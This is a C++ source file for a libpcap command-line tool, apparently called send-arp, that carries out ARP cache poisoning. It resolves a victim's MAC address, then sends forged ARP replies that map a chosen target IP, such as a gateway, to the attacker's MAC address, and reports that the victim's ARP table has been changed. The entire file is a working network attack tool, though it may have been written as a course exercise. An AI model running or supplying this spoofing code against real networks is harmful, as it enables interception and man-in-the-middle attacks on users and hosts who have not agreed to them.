#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <set>
#include <pcap.h>
#include <ifaddrs.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void getMyMacAddr(const char* interfaceName, Mac& myMac) {
    struct ifaddrs *ifaddr = NULL;
    struct ifaddrs *ifa = NULL;

    string macAddr = "";

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
    } else {
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if ((ifa->ifa_addr) && (ifa->ifa_addr->sa_family == AF_PACKET) && !strcmp(ifa->ifa_name, interfaceName)) {
				struct sockaddr_in *sa = (struct sockaddr_in *) ifa->ifa_addr;
            	
                ostringstream oss;
                struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
                for (int i = 0; i < s->sll_halen; i++) {
                    oss << hex << setfill('0') << setw(2) << static_cast<int>(s->sll_addr[i]);
                    if (i != s->sll_halen - 1) oss << ":";
                }
                macAddr = oss.str();
            }
        }
        freeifaddrs(ifaddr);
        myMac = Mac(macAddr);
    }
}

void getMacAddrFromSendArp(pcap_t* handle, const Ip myIp, const Mac myMac, const Ip targetIp, Mac& saveMac) {
	EthArpPacket packet;
	// * 1. send ARP request to get MAC address of ip_str
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(myIp);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(targetIp);

	// * 2. get MAC address from ARP reply
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res!= 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
		exit(EXIT_FAILURE);
        return;
    }

	// * 3. Wait for the ARP reply and extract the MAC address
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;

        res = pcap_next_ex(handle, &header, &replyPacket);
        if (res == 0) {
            continue; // Timeout, no packet captured, continue listening
        } else if (res < 0) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            exit(EXIT_FAILURE);
        }

        // * 4. Parse the received packet
        EthArpPacket* receivedPacket = (EthArpPacket*)replyPacket;

        // Check if the received packet is an ARP reply and matches the target IP
        if (ntohs(receivedPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(receivedPacket->arp_.op_) == ArpHdr::Reply &&
            ntohl(receivedPacket->arp_.sip_) == static_cast<uint32_t>(targetIp) &&
    		ntohl(receivedPacket->arp_.tip_) == static_cast<uint32_t>(myIp)) {

            // * 5. Extract the MAC address from the ARP reply
            saveMac = receivedPacket->arp_.smac_;
            return;
        }
    }
    
    fprintf(stderr, "Failed to get ARP reply\n");
}

void send_arp_attack_packet(pcap_t* handle, const char* senderIpStr, const char* targetIpStr, Mac myMac) {
	Mac senderMac;
	Ip senderIp = Ip(senderIpStr);
	Ip targetIp = Ip(targetIpStr);
	getMacAddrFromSendArp(handle, targetIp, myMac, senderIp, senderMac);
	
	EthArpPacket packet;

	packet.eth_.dmac_ = senderMac;
	packet.eth_.smac_ = myMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myMac;
	packet.arp_.sip_ = htonl(targetIp);
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(senderIp);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	printf("The MAC address of IP %s in the ARP Table of IP %s has been changed to my Mac address(%s).\n", senderIpStr, targetIpStr, string(myMac).c_str());

}

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	vector<pair<char*, char*>> sender_target_pairs;
	for (int i = 2; i < argc; i += 2) sender_target_pairs.push_back({argv[i], argv[i + 1]});

	Mac myMac;
	getMyMacAddr(dev, myMac);

	set<string> senderSet = set<string>();

	for (const pair<char*, char*>& pair : sender_target_pairs) {
		if(senderSet.find(pair.first) != senderSet.end()) continue;
		
		send_arp_attack_packet(handle, pair.first, pair.second, myMac);
		senderSet.insert(pair.first);

		printf("Send <%s, %s>\n", pair.first, pair.second);
	}
	
	pcap_close(handle);
}
